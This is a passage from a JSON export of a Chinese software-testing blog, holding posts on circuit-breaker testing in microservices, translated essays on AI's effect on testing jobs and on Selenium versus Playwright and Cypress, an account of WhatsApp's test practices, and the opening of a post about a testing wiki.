","date":"2024-02-19T11:53:47+08:00","permalink":"zh.ethanhan.cc/p/ai%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E5%9C%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E7%94%A8%E4%BE%8B%E7%94%9F%E6%88%90%E4%B8%AD%E7%9A%84%E6%8E%A2%E7%B4%A2/","title":"AI大语言模型在自动化用例生成中的探索"},{"content":"在软件系统领域，熔断器就像守护天使一样，防止级联故障的发生。这篇博客文章深入探讨了这些守护者在各种场景下的细致测试，探索了加强应用程序抵御故障和失败的重要实践。加入我们，一起踏上测试场景、容错性、集成、性能等方面的探索之旅吧！\n理解熔断器 本质上，熔断器模式是一种设计策略，用于分布式系统中屏蔽应用程序免受故障的连锁反应。类似于电气熔断器在发生故障时中断电流通路，其软件对应版本通过停止向故障组件或服务发送请求来保护系统。\n想象一下，系统中单个组件发生故障，引发多米诺骨牌效应，使整个应用程序崩溃。这就是熔断器发挥作用的地方，它作为哨兵检测异常并隔离故障组件。通过这样做，它防止故障在整个系统中蔓延，允许应用程序的其他部分继续运行。\n为了使这个概念更加具体，请考虑您家里的电气系统。当出现电涌或故障时，电气熔断器会中断电流通路，防止损坏您的电器。同样，在软件世界中，熔断器作为保护屏障，隔离故障并确保整个系统的完整性。\nQA自动化工程师的作用 熔断器作为系统弹性的守护者，必须经过严格的测试才能有效地完成其任务。QA工程师（我们）带着必要的工具和方法进入这个领域，以验证熔断器在各种场景下的功能和响应。我们的角色超越了传统的测试；我们是保证的架构师，为潜在的系统故障构建盾牌。\n软件应用程序的可靠性是用户满意度的基石。我们精心设计和执行模拟真实世界的测试场景，将熔断器推到极限。通过这样做，我们确保当系统遇到压力、故障或意外事件时，熔断器能够精确响应，减少对整体用户体验的影响。\n一个有弹性的系统必须能够优雅地处理故障并无缝恢复。我们设计和执行测试，仔细检查嵌入在熔断器中的容错机制。我们安排组件故障场景，验证熔断器是否隔离了问题，允许系统优雅地恢复。\n测试场景 当我们深入熔断器测试领域时，阐明这些沉默守护者发挥作用的各种场景，加强应用程序抵御潜在中断，是非常重要的。让我们解开常见场景，深入研究我们用来验证熔断器有效性的特定测试用例。\n熔断器常见场景： 服务中断： 场景：模拟关键服务发生中断的情况。 目标：验证熔断器是否能迅速检测到服务故障并隔离受影响区域，防止级联故障在整个系统中发生。 高延迟： 场景：在系统组件之间的通信中引入高延迟。 目标：评估熔断器如何响应增加的响应时间，确保它及时介入以防止整体系统性能下降。 资源耗尽： 场景：创建导致资源耗尽（例如，内存、CPU）的条件。 目标：评估熔断器识别资源相关问题和保护系统免于潜在崩溃或性能下降的能力。 熔断器功能特定测试用例： 阈值验证： 测试用例：验证当失败数量超过预定义阈值时，熔断器是否激活。 目标：确保熔断器对不断升级的失败数量做出积极响应，防止对整个系统产生广泛影响。 平滑降级： 测试用例：有意降低组件的性能，并验证熔断器如何处理这种情况。 目标：确认熔断器是否介入隔离性能下降的组件，允许系统其他部分以最小的中断运行。 恢复时间评估： 测试用例：触发故障并测量熔断器允许流量恢复所需的时间。 目标：评估熔断器在故障解决后迅速恢复正常运行的效率。 容错与恢复：熔断器的守护之力 在熔断器测试的复杂世界中，让我们聚焦两个关键方面：容错性和恢复机制。熔断器犹如警惕的守护者，在应用程序面对故障时发挥着不容小觑的作用。\n容错性是系统在出现故障或失败时仍能继续运行的能力。熔断器能够检测和隔离故障组件，是增强应用程序抗干扰性的重要手段。通过迅速控制问题，它们可以防止单个故障演变成灾难性的系统崩溃。\n当故障发生时，熔断器中嵌入的恢复机制就会启动，负责将系统恢复到正常状态。这些机制可能包括自动重试、回退机制或受控地重新引入之前被隔离的组件。其目标不仅是防止级联故障，而且要促进系统性能无缝恢复到最佳状态。\n在细致的测试过程中，我们扮演着验证这些恢复机制有效性的关键角色。通过有针对性的测试场景，我们评估熔断器从故障中恢复的良好程度，确保恢复过程不仅迅速，而且能保持应用程序的整体完整性。\n我们关注的关键验证点：\n恢复时间 测试用例: 验证熔断器在故障解决后能迅速恢复。 目标：评估恢复机制在最小化停机时间和恢复正常运行方面的效率。 数据完整性 测试用例: 测试数据完整性在故障和后续恢复过程中可能存在风险的场景。 目标: 确保熔断器的恢复机制保持数据一致性和完整性。 回退机制 测试用例: 评估当主组件仍然不稳定时，熔断器如何顺畅切换到回退机制。 目标: 确认回退机制提供可靠的替代方案，防止服务长时间降级。 集成测试 应用程序很少单独存在，它们通常依赖外部服务或 API 来实现特定的功能。集成测试是确保这些互连组件协同工作的关键。对于熔断器而言，测试它们与外部实体的交互对于保证系统整体弹性至关重要。\n我们设计测试场景，在其中与外部服务或 API 等集成组件遇到故障。模拟这些故障是一门细致的艺术，涉及注入故障或操控响应以模拟真实世界的情况。这种方法使我们能够观察到当外部依赖项出现故障时，熔断器如何响应。\n集成测试场景示例\n服务不可用： 测试用例: 暂时使外部服务不可用。 目标： 验证熔断器是否识别到不可用性，并激活以防止故障在系统中传播。 延迟峰值： 测试用例: 引入集成 API 的响应时间突然峰值。 目标： 评估熔断器处理增加延迟的良好程度，确保其介入以保持应用程序的整体响应性。 间歇性错误： 测试用例： 在外部服务的响应中引入间歇性错误。 目标： 验证熔断器是否能有效识别和隔离间歇性错误，防止对系统产生连锁反应。 作为集成架构师，我们精心设计和执行这些测试，细致地检查熔断器在各种集成场景下的行为。通过这样做，我们可以确保熔断器成为弹性的守门员，保护应用程序免受外部依赖项不可预测的影响。\n性能测试：确保熔断器既坚固又轻盈 在探索熔断器测试的复杂世界时，还有一个关键维度需要关注：性能。熔断器虽然擅长防止级联故障，但也必须在保持最佳系统性能方面找到微妙的平衡。在本节中，我们将揭开熔断器的性能影响，并探讨我们如何细致地评估它们在压力下的有效性。\n虽然熔断器是不可或缺的保护措施，但它们本身也需要考虑设计带来的性能影响。引入熔断器会增加系统的复杂性，我们必须确保这一层额外的复杂性不会无意中损害应用程序的整体性能。\n我们设计了测试场景，突破系统容量的极限，模拟压力条件以评估熔断器的响应。这包括让系统承受高负载、增加流量或资源耗尽，观察熔断器如何优雅地处理这些苛刻的情况。\n性能测试洞察：\n吞吐量评估： 用例: 增加请求量以测试系统的吞吐量。 目标： 评估熔断器如何管理增加的流量，确保它不会成为整体系统性能的瓶颈。 资源利用率 用例：故意消耗系统资源，评估熔断器对资源利用率的影响。 目标： 验证熔断器操作不会过度消耗系统资源，保持平衡的分配。 响应时间分析 用例: 分析熔断器在压力条件下对响应时间的影响。 目标： 确保熔断器迅速介入，不会过度延迟响应，保持最佳用户体验。 我们在性能测试过程中小心翼翼，力求达到微妙的平衡。我们的目标是使用强大的熔断器强化系统，同时确保这些守护者不会无意中损害他们试图保护的性能。\n日志记录和监控 日志记录和监控是系统的耳目，捕捉揭示其内部运作的关键数据。对于熔断器而言，这些机制在正常运行和故障时期都至关重要，可以提供对事务状态的洞察。它们让我们洞悉熔断器的决策及其对整个系统的影响。\n验证实施效率：\n全面日志记录： 验证熔断器操作（例如打开、关闭和状态转换）是否被彻底记录。 目标： 日志记录应该是全面的，有助于事后分析，并提供熔断器决策的清晰图景。 实时监控： 确认监控是否能实时显示熔断器状态和相关系统指标。 目标： 实时监控对于快速识别异常情况并响应潜在问题至关重要。 警报机制： 测试熔断器在关键事件期间触发的警报机制。 目标：及时的警报可以促使主动响应，使系统管理员能够迅速解决潜在问题。 我们在细致的测试过程中肩负着确保日志记录和监控机制不仅仅是旁观者，而是积极的守护者的责任。我们验证这些机制是否提供了清晰准确的熔断器决策叙述，为故障排除和持续改进提供了路线图。\n最佳实践和实用的技巧 在熔断器测试的旅途中，采用最佳实践和利用智慧的技巧至关重要。\n最佳实践：\n场景多样性： 设计涵盖各种潜在故障和压力条件的多种测试场景。 理由： 综合场景可以确保全面评估熔断器的能力，使系统为现实世界中的各种挑战做好准备。 自动化： 自动化重复和复杂的测试用例，确保一致性和效率。 理由： 自动化使我们能够一致地执行大量测试，从而进行更频繁和可靠的测试。 与开发人员合作： 与开发人员合作，了解熔断器实现的细微差别。 理由： 密切合作确保双方对系统行为有共同的理解，从而制定更有效的测试策略。 创建测试场景的技巧：\n用户视角： 设计模拟真实用户交互和潜在故障点的场景。 洞察： 模拟用户体验有助于发现孤立测试用例可能无法发现的漏洞。 极限情况探索： 探究极限情况，了解熔断器在极端条件下的表现。 洞察： 识别和处理极限情况确保熔断器在面对意外挑战时保持稳健。 持续迭代： 根据现实事件和系统变化迭代改进测试场景。 洞察： 熔断器测试是一个不断发展的过程，持续改进确保它与应用程序不断变化的性质保持一致。 熔断器测试之旅：总结与展望 在熔断器测试的精彩旅程中，我们揭示了这些守护者在加强应用程序抵御故障方面的关键作用。我们作为QA架构师，塑造了熔断器的可靠性和容错性。在结束之前，请记住：\n拥抱多样化的测试场景并利用自动化进行全面和一致的测试。\n鼓励持续测试和适应的思维方式，确保测试策略随软件系统的动态特性而演变。\n促进 QA 和开发团队之间的合作，以增强熔断器的稳健性，从而在不断变化的挑战面前保护应用程序。\n我希望这次旅程帮助您更深入地了解熔断器测试的重要性，以及它如何为构建更强大、更可靠的软件系统做出贡献。请记住，测试是一个持续的过程，随着技术和需求的不断变化，最佳实践和策略也将不断演变。请保持不断学习和探索精神，让您的应用程序在数字世界的激流中永保安全！\n","date":"2024-02-19T10:24:38+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%B8%AD%E7%9A%84%E7%86%94%E6%96%AD%E5%99%A8/","title":"如何测试微服务中的熔断器"},{"content":"关于ai与测试的讨论现在逐渐流行起来，目前看来观点基本是积极和激进的，大多数人认为ai会重新塑造测试行业，不过基于ai的测试探索目前看来还是有限的，我稍微总结了一下，大概分为两类。\n利用大语言模型的推理能力进行驱动的自动化工具；这个之前的文章已经介绍过一些了，有兴趣的同学可以翻一下之前的存档； 对融合了ai功能的软件产品进行测试。推荐大家研究一下这篇文章，里面的一些标准步骤还是让人备受启发的。https://blog.scottlogic.com/2023/11/14/testing-LLM-based-applications-strategy-and-challenges.html。这些测试大多是对prompt的安全，边界条件以及输出的稳定性进行测试。 就这个时间节点看来，ai在测试领域上的应用其实不算太多。另外目前对于大模型本身的测试工作也基本是众测模式，模型提供商经过基本的fine tuning和测试之后发布模型或者提供api接口，通过使用者的反馈来持续的改进模型，基本上走的是强化学习的路子，对模型的测试不依赖于测试行为，而依赖于更多样性的标记数据，所以哪家大模型能跑出来其实就是看哪家的显卡多和数据多。\n最近看到一篇非常积极拥抱ai的测试文章，里面的观点基本没有数据佐证，先不去讨论正确与否，不过文章确实传递出了一种很强烈的乐观信号，因为这篇文章认为ai会带来更多的测试岗位和更高的报酬。下面是对这篇文章的翻译，https://jarbon.medium.com/ai-more-testers-more-money-045e1a34741d。先提前说明，对这种观点我持谨慎的乐观态度，尽管我一直认为从事ai其实跟我们当年做黑盒测试差不多，不过下文的描述在短期看来还是比较难达成的，未来是什么样确实比较难以预测，所以不如积极投身其中去创造未来吧。\n下面是原文的翻译：\nAI裂变正在迅速到来。AI将在软件测试领域创造新的有和无。将AI引入软件测试将改变测试人员、供应商和工具的工作方式。但是，这种变化不会如大多数人所担心或梦想的那样。声称AI很快就会简单地取代人工测试人员的工作是错误的。希望AI无法足够聪明地完成大部分测试工作也是错误的。将会有更多的测试工作，并且它们很快将得到更高的报酬。在这个过渡中，有些人会失去工作，但这取决于他们自己。只有思想开放、乐观的测试人员才能在这个过渡中生存下来，并且他们将得到丰厚的工作保障和报酬。\nAI对测试工作的影响 在短期内，AI不会减少测试工作的数量 - 对测试人员的需求将会增加。许多测试人员担心AI会消灭他们的工作 - 这对大多数人来说是不真实的。应用AI于工作的“AI辅助”测试人员将更加高效。那些能够迅速做到这一点的人将获得最多的工作保障、进步和回报。\n在10亿美元以上的测试领域中，最大的问题可能是如何衡量价值。工程团队知道他们需要测试，但很难量化，而事实是，大多数测试工作在今天没有AI的情况下几乎没有什么用处。当测试人员得到AI的辅助时，测试人员的速度、范围和价值将增长到明显的价值点。目前，大多数软件测试仅仅涵盖基本功能和一些边缘情况，成本高昂，并拖慢了工程团队的进展。\n然而，AI辅助测试将赋予这些人类测试人员“超能力”，他们的贡献将是压倒性的明显。正如测试领域的一位朋友上周所描述的那样 - 不久之后，测试人员将穿戴AI-“钢铁侠”装备。企业将希望增加更多的AI测试人员，因为他们终于看到了明显的积极回报。这些AI辅助测试人员将足够快，以便在当前的开发周期内发挥作用，给人足够的信心进行发布，发现对业务有影响的问题，并揭示仍待测试的内容。对于AI辅助测试人员的需求将增加，因为他们将为企业增加明显的价值 - 就像开发人员增加功能和修复错误一样。\nAI还意味着开发人员正在创建更多的软件。AI辅助工程师的加速是非常真实的，而且AI也意味着更多的人可以创建软件。所有这些新软件都需要由更多经过AI增强的测试人员进行测试。\n在短期内，测试工作的数量将增加，但并非所有人都会受益。那些不接受AI的测试人员很快将被时间的洪流所淘汰。一些大声疾呼的测试人员将在技术进步的浪潮中哭泣，因为他们被吞噬了。有趣的是，他们的工作不会消失，他们只是为了一批对测试感到兴奋并渴望利用AI的新一批测试人员而被解雇。这些工作不会消失，但会由接受AI的测试人员来填补。\n由于AI的存在，测试人员将获得更高的报酬。有效地利用AI来帮助测试任务并不容易，需要更好的测试人员。AI将取代基本的测试 - 甚至可能进行大部分测试。AI可以生成数百、数千甚至数百万个测试的排列组合 - 并在没有人类干预的情况下执行。工程团队将需要AI辅助测试人员决定如何在所有可能的覆盖范围内分配有限的计算/时间资源。基于AI的测试人员的一个关键角色是根据团队和业务目标定制测试机器人。这些AI辅助测试人员将在被AI自动化的开发人员之后仍然需要。\n“AI基础测试人员的一个关键角色是根据团队和业务目标定制测试机器人。”\n不再躲在小隔间或JIRA中 - 这些AI辅助测试人员将积极与团队中的其他人员进行沟通。高效和清晰的顶级沟通技巧将供不应求。目前的非AI测试意味着测试人员无法运用这些技能，因为基本的、不充分的覆盖范围很容易理解和执行。AI辅助测试意味着工程团队将需要更多经验丰富的测试人员，并且需要更多这样的人。\n“预测：离开领域成为产品经理或开发人员的测试人员将很快回流到相对高薪和安全的高级测试工作。”\nAI裂变 在向AI辅助测试的过渡期间，会有许多负面声音。“只有人类才能进行测试。”“AI还不够可靠。”“测试自动化没有取代我的工作……”“我仍然需要，因为……”“AI无法思考。”这些人不会一夜之间消失，但他们会逐渐安静下来。他们是自愿选择退出测试群体的人。\n一些人会意识到他们的错误（金钱和市场是强大的力量），悄悄开始应用AI，并删除他们反对AI的社交媒体帖子。更多的人将被礼貌地“解雇”，并越来越难找到另一个测试角色。\n可悲的是，一些测试人员会屈服于他们在测试工作中所宣扬的偏见。他们不会承认对连续性的个人偏见。许多人会屈服于幸存者偏差。他们的团队和圈子是技术领域中情绪抵抗的回音室。讽刺的是，我们甚至看到许多自称为专家的测试人员在他们甚至没有“测试”新的AI辅助技术之前就认为AI还为时过早、太危险或者“没有用”。跟随这些负面的人和梗，风险自负！\n提示：迟钝的采用者将继续迟钝，这对于在快速发展的AI世界中的工作保障并不好。\n有些人对新技术的采用速度较慢，或者更加风险规避，仅仅是因为他们的生活状况。作为测试社区，我们应该尽力帮助这些人，确保他们了解我们领域中正在发生的事情。我们应该以易于采用和应用于测试的方式构建AI辅助测试。我们应该不断展示和分享AI辅助测试的价值。我们需要确保这些人不仅仅被留在那些声音嘈杂的老派测试人员和那些有个人议程和偏见维持现状的人的任性之中。\n总结 AI是对测试人员的试金石。AI正在快速进行更多的测试，但也增加了对经验丰富的人类测试人员的需求。AI还将揭示传统测试人员的负面情绪和偏见，他们很快就会消失。即使是测试人员对软件测试的现状也不满意，但是采用AI辅助测试的测试人员将迅速改变这个现实。\nAI是对测试人员的试金石。\n从长远来看，AI将从所有AI辅助测试人员那里学习。AI和AI辅助测试人员将不断提升，形成一个良性循环。这个良性循环将使软件变得更好，并改善那些积极接受它的软件测试人员的生活。\n","date":"2024-02-01T10:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%9B%B4%E5%A4%9A%E7%9A%84%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E6%9B%B4%E5%A4%9A%E7%9A%84%E6%8A%A5%E9%85%AC/","title":"更多的测试人员，更多的报酬"},{"content":"selenium已死？其他的框架例如playwright, cypress当立？这是去年一个广泛讨论的话题。对于我来说这个观点很明显是偏颇的，因为\nselenium本身已经成为了w3c规范的一部分，现在市面上所有的浏览器都遵循这个规范 selenium本来就不是一个纯测试工具，它是为自动化而生，除了浏览器测试之外，selenium还有很广泛的用途，而playwright/cypress则更专精于测试领域 selenium的api相当稳定，对于一些需要长期维护的项目来说这是非常有诱惑力的，而我去年用playwright做了一个项目，今年由于api升级，去年的代码基本上已经完全不可用了 所以对我来说，selenium尽管已经徐娘半老，吸引力大不如前，但在某些场景下，selenium仍然会是我的首选工具，就像是vb/php一样，尽管大家都已经看衰很多年了，但这些技术一直没有落幕退场。\nselenium官方可能也察觉到了这些广泛的讨论，昨天他们官网blog发了一篇文章，直接讨论selenium与其他工具的情感纠葛，上下文可能是不少人发博文比较selenium与其他工具，然后标题党一下，使得大家产生错觉：selenium真的已经快死翘翘了。这篇内容专业简洁，适合给大家消除误解，原文地址：https://www.selenium.dev/blog/2024/selenium-vs-blog-posts/。\n下面是全文翻译。\n这篇博文讨论了那些比较Selenium、Cypress和Playwright的标题党文章。这些文章没有意义，也没有帮助。\n作者：David Burns (@AutomatedTester) | 2024年1月9日星期二\n在博文中，关于自动化测试的标题党文章最容易的方式就是将Selenium与其他工具进行比较，并配以一个吸引人的标题，尤其是当它贬低现有工具时。\n不幸的是，这可能会使人们对这些产品中的哪些功能可用产生困惑，尤其是当我们进行同类的过度类比时。\nSelenium一直是一个很好的浏览器自动化工具。对于该项目来说，幸运的是，它已经成为测试Web应用程序的首选工具近20年。该项目专注于构建越来越复杂的浏览器自动化的难点。项目的重点一直是稳定的API和可扩展性，以保证Selenium的运行。它没有关注人们如何进行测试，因为有非常好的测试框架可用，并且为5种不同的编程语言进行测试是一项非常重要的工程工作。\n然而，这些博文中经常出现一些误解。\n与Playwright和Cypress相比，设置浏览器和驱动程序太困难 过去确实如此，因为您需要下载驱动程序。对于GeckoDriver和SafariDriver来说，这并不太糟糕，因为它们可以优雅地处理浏览器升级。另一方面，对于基于Chromium的浏览器，您需要为每个新版本更新驱动程序。\n现在，Selenium已经自动处理了这个问题。如果找不到ChromeDriver或EdgeDriver，它将使用Selenium Manager进行下载。自首次发布以来，它已经有了很大的改进，现在可能是最好的选择，因为最新版本的Selenium甚至可以下载并使用浏览器。与Playwright和Cypress相比，您不需要更新对Selenium的依赖以更新浏览器和驱动程序，您仍然使用与您的客户相同的浏览器，并且切换版本变得轻而易举：您也不必更改您正在使用的测试框架。此外，让我们不要忘记它使用的是Google推荐用于测试的浏览器。\n设置Test Runner 是一项艰巨的工作，而Playwright和Cypress已经内置了\u0026hellip; 嗯\u0026hellip;也许吧？使用Selenium设置端到端测试框架并不像一些人所认为的那么困难。真正困难的部分实际上是确保驱动程序位于正确的位置，我们已经解决了上面讨论的问题。一旦完成了这一步骤，Selenium的方法允许您使用您最熟悉的任何测试框架。如果您希望使用“全家桶”方法，将Selenium与Test Runner紧密集成，那么诸如SeleniumBase、Nightwatch、Serenity等使用Selenium的众多项目可能是适合您的工具。\n需要注意的一点是，Playwright是与Selenium类似的唯一的多语言浏览器自动化框架。然而，如果您不使用TypeScript或JavaScript，仍然需要自己设置Test Runner。一些测试框架具有自动设置可能需要的Fixture的插件。在JavaScript/TypeScript领域，如果您真的需要一个内置的Test Runner，那么像NightwatchJS这样的下游项目和像WebdriverIO这样的相关项目就可以满足您的需求。下游项目使用我们的库，相关项目有自己的库，但仍遵循WebDriver标准。\nPlaywright和Cypress可以进行网络拦截，并允许我编写事件驱动的代码，而Selenium不能 自从Selenium 4发布以来，它已经能够提供这个功能。它非常好，以至于Playwright甚至建议您使用它来扩展您的测试。Selenium项目不会很快删除这些功能，因为我们依赖于WebDriver BiDi规范的实现来替代它们。即使如此，Selenium始终致力于确保升级不会在没有足够警告的情况下破坏任何功能。这就是为什么每种编程语言都提供了高级封装，例如NetworkInterceptor，以隔离您的测试与底层技术的关系。\n总结 从上面的内容可以看出，Selenium仍然与市面上的产品一样出色。与Cypress或Playwright不同的是，Selenium是一个由志愿者驱动的项目，而不是商业支持的项目。想要帮助我们吗？为什么不撰写一篇关于您如何使用上述功能的博文，或在社交媒体上发布这些功能如何使您的生活更轻松的帖子呢？\n","date":"2024-01-11T11:49:16+08:00","permalink":"zh.ethanhan.cc/p/slenium%E5%B7%B2%E6%AD%BB/","title":"Slenium已死？"},{"content":"看到了一篇关于whatsup是如何做测试的文章，尽管里面有一些拍领导彩虹屁的嫌疑，不过还是可以让我们了解到meta(whatsup属于meta)内部整体质量保障架构的情况。翻译了一下，供大家参考。原文地址: https://automationhacks.io/2023-10-18-how-whatsapp-tests-software\n我正在思考WhatsApp团队如何测试其应用程序以及全球其他团队可以从他们的测试工程实践中学到什么。这也是很多人问我的一个经常性问题，所以让我们来揭开一些面纱，好吗？\n测试方法 我在2021年底到2023年中期的一年半时间里，作为WhatsApp测试自动化团队的成员，在他们伦敦办公室工作，我有幸近距离观察了一个拥有20亿多用户的应用程序是如何进行测试的。\nWhatsApp测试自动化团队负责开发测试基础设施、工具和框架，以便让开发人员为WhatsApp客户端（尤其是Android、iOS、Web和桌面应用程序）编写高效的测试。这是整个组织测试策略的关键部分。\n在某些方面，这些方法与其他面向消费者的移动应用程序相似，具有测试金字塔的各个典型层次。WhatsApp团队倾向于使用许多开源工具来编写自动化测试，但也使用许多内部元工具和基础设施来加强整个测试策略。WA的测试方法也与元应用程序有很大的不同。\n在本文中，我将讨论两个关键因素，这些因素促成了自动化的强大文化。\n框架和基础设施 支持这一文化的团队和角色 让我们深入探讨一下吧 🏊\n测试框架 首先，让我们看看测试金字塔的不同层次，以及使用了哪些不同的工具和框架。\n对于移动框架，自动化测试在测试金字塔的各个层次上进行编写，使用了大量的Espresso和XCUITests，相对较少的E2E测试。\nAndroid\nUnit tests: JUnit, Roboelectric UI tests: Espresso Screenshot tests: Screenshot tests for Android (read more about this here 🔗) E2E tests: Jest-based internal E2E testing framework iOS\nUnit tests: XCTest UI tests: XCUI Tests Snapshot tests: Probably similar to GitHub - uber/ios-snapshot-test-case: Snapshot view unit tests for iOS E2E tests: Jest-based internal E2E testing framework 测试基础设施\nWhatsApp依靠许多内部元基础设施来进行设备测试和持续集成（CI）需求。\n代码覆盖率\n内部基础设施用于收集单元测试和UI测试的代码覆盖率 内部看板用于可视化代码覆盖率的趋势和指标 版本控制\nGit Mercurial Test Runner 内部自研Test Runner\n设备和模拟器 内部系统\nBuild\nAndroid：Gradle，iOS：Xcode Buck2 测试报告\n内部日志基础设施 Scuba中的测试监控 内部报告基础设施 持续集成（CI 内部CI\n测试服务\n测试选择 测试建议 使用Sapienz进行Monkey测试 使用Infer进行静态分析 在收集这个列表时，我意识到Meta（前Facebook）是一家拥有令人敬畏的工程文化的公司，他们会将许多内部工具的博客开放源代码，并对其进行讨论。如果您想了解他们的测试方法的其他想法，我建议您关注DevInfra博客，并查看GitHub项目，以进一步了解如何在您自己的团队中采用其中的一些方法。\n一大堆工具和框架 🧑‍🍳 令人着迷的是，有这么多丰富的工具和框架，都由可扩展的基础设施支持。因此，工程师们花费较少的时间来维护这些工具或解决基础设施问题，而是将重点放在编写测试上，知道只要按照推荐的实践编写测试，测试就会运行和扩展。\n您可能还注意到，大多数这些工具在许多公司和初创企业中都得到了使用，也有开源解决方案来解决这些问题。\n只是在Meta，多年来通过大量的工程时间对内部工具进行了优化，并且它们相互之间非常好地集成，形成了一个生态系统。要理解所有这些并不是一件很容易的事情，而测试自动化基础设施团队有幸置身其中。\n那么，WhatsApp是如何“真正”测试其软件的呢？ 在这一点上，您可能会想，WhatsApp使用一堆工具来实现自动化测试，也许会想知道这些不同的团队和工程师是如何组织起来的。\n让我们看看测试设置和涉及的主要角色。\n工程师负责编写自动化测试 在WhatsApp，开发人员自己编写大部分自动化测试。\n他们编写应用程序代码，包括单元测试、UI测试，有时还会编写一些端到端（E2E）测试。我之前在这个文化实践上写过一篇简短的笔记，如果感兴趣，可以在这里阅读。\n这里，我主要指的是移动工程师，因为WhatsApp作为一款聊天应用程序，客户端占据了很大的比重。还有一些服务器团队也遵循类似的理念，他们自己编写测试。\n在某种程度上，这是相当好的，因为工程师对他们的测试负责，并且对于任何SEV（生产事故），他们自然会有动力编写适当级别的自动化测试来覆盖他们的代码并减轻任何风险。\n我没有看到在特性团队中有任何专门的自动化团队，他们由SDET（软件测试工程师）或SET（软件工程师测试）人员来负责编写自动化测试，这在初创公司和许多其他公司中通常很常见。\n这种做法引发了一些自然的问题：\n这种方法有什么一级和二级影响？ 那么工具和基础设施怎么办？难道没有人来维护吗？ 与由专门的测试专家编写的测试相比，由工程师编写的测试质量更高吗？ 嗯，您对此提出质疑是完全正确的。\n优点 👍\n其中一个好处是通常会编写很多自动化测试。 如果这些测试质量不好（即易失效和不可靠），基础设施本身会负责将其从执行中移除，并通过任务系统通知作者。 另一个好处是没有专门的质量保证团队来编写所有的自动化测试。 工程师不需要担心构建工具和基础设施，只需利用现有的东西来编写测试。 易失效的测试能够更快地修复（因为有更多的工程师关注这个问题）。 工程师更好地理解测试实践，而在这种情况下，“质量是每个人的责任”不仅仅是挂在墙上的海报，而是有实际意义的。 缺点 👎\n有时测试断言不够健壮。 测试中有很多重复的代码，没有太多关注如何构建正确的抽象。由于工程师认为编写测试只是完成任务清单中的另一个任务以发布功能，他们并不特别注意构建良好的可重用抽象。 编写了许多易失效和不稳定的测试用例。 基础设施团队构建测试工具和框架 在WhatsApp，有多个基础设施团队负责这项工作。\n他们的任务是全面考虑测试策略，深入和广泛地思考。这些团队不编写测试，但是他们帮助构建足够级别的测试基础设施和工具，以支持开发人员编写他们的测试。\n他们非常关心和关注应用程序的质量，并构建解决方案，使开发人员的工作更轻松。他们被视为测试自动化的领军者和专家，开发团队依赖他们提供指导，并为其特定需求构建任何专门的解决方案。他们还编写内部文档和测试自动化课程等教育资料。\n从我的观点来看，有这样一支专门的团队的需求非常明确。\n为什么呢？\n很高兴你问到了。😉\n一个被指派负责功能开发和自动化测试的开发人员几乎没有时间构建可扩展的系统性测试解决方案。基础设施开发人员不需要担心编写测试或日常功能交付，他们可以专注于构建工具（无论其针对的测试精度如何）。由于他们为不止一个团队构建工具，这也会导致更好、更通用的解决方案，可以广泛适用。\n关键的要素是领导团队的支持和认可，以确保获得支持和资金。如果没有这一点，这样的团队无法繁荣发展，在WhatsApp，我们很幸运地拥有非常强大的领导者支持这个团队。\nProd Ops团队支持基础设施团队 尽管基础设施开发人员是优秀的软件工程师，其中一些人之前在全职移动端和后端软件开发方面有背景，但他们很少来自纯测试背景（QA或SDET）。\n他们知道如何构建基础设施和工具解决方案，但对于与功能团队建立深入联系以了解SDLC的所有细枝末节或花费大量时间尝试不同的测试框架和方法，他们了解得并不深入。\nProd Ops团队填补了这个特定的空白。这个团队由被称为TQS（Technical Quality Specialists）的工程师组成。\n从某种程度上说，这个团队类似于传统的质量保证团队，负责在整个产品中领导质量计划。这个团队中也有一些Android/iOS开发人员。\n他们负责一系列重要的活动。\n他们是探索性测试的专家，并深入了解产品和流程。他们会关注产品中的重点领域，确保在测试和质量方面发生正确的事情，比如频道、头像等功能。 他们通过以下方式支持基础设施和功能团队： 进行测试设计并建议测试用例，并根据价值对其进行优先级排序 通过删除冗余用例，确保测试套件健康 支持生产测试和实验 对客户问题进行分类和反馈给产品团队，并主导缺陷分类 构建对质量状态的有见地的看板 他们有时也编写自动化的端到端测试，并帮助分析测试的易失效性 他们是一个有价值且核心的团队，拥有互补的技能，使WhatsApp的质量文化得以发挥作用，并且在我看来，他们是将整个系统紧密联系在一起并使这种设置能够良好运作的重要纽带。这个团队的质量计划也得到了强有力的领导支持。 在功能团队中设置一个测试负责人 除了上述团队之外，WhatsApp还指定了每个功能团队中的一名工程师担任测试负责人角色，负责审查当前季度的测试计划，找出测试覆盖不足的领域，并鼓励开发人员为这些领域编写测试。\n他们还与测试自动化团队保持同步，了解当前正在开发的工具和功能的专业知识，并在自己的团队内推动对它们的认识。\n他们建立了定期的会议机制，测试负责人会展示他们的计划，收集反馈，然后回去推动执行。整个项目由WhatsApp内部的一位领导型软件工程师管理。\n在我看来，团队内部产生这样的思想领导力，是确保WhatsApp对质量的承诺得以维持，以及确保稳定发布的关键因素。\n总结 总结一下：\nWhatsApp利用自动化测试来推动质量和测试覆盖率 WhatsApp的工程师自己编写测试 测试自动化团队帮助构建基础设施和工具，以支持工程师 Prod Ops QA通过领导质量计划来支持基础设施和功能团队 开发人员在测试工程方面拥有专业知识的思想领导力有助于推动这一切 强有力的领导支持这些团队，并将他们配备有才华的高级工程师，有助于朝着正确的方向推动工作。 你是否注意到所有这些团队和功能都致力于实现更快地发布高质量的代码的共同目标？测试自动化和质量是庞大的领域，需要很多细微之处和技能，以确保正确的战略投入进入开发工作流程中。\n总之，关注质量和领导层在实现这些设置方面的投资不是个别个体的事情，而是需要整个团队的共同努力。\n希望这对你有帮助。如果对此有任何想法或问题，请在评论中告诉我。\n","date":"2024-01-10T10:25:36+08:00","permalink":"zh.ethanhan.cc/p/whatsup%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E6%B5%8B%E8%AF%95%E7%9A%84/","title":"Whatsup是怎么做测试的"},{"content":"https://ray.run/wiki\n这个网站应该是我见过最全面的关于测试领域的知识整理了。稍微写代码数了一下，应该有200多个主要知识点，每个下面都有很多的常见问题。知识点的解释其实没啥突出的，不过常见问题对于面试来说就非常的顺手了。\n稍微列举1个有意思的主题。\nDefinition of Acceptance Test Driven 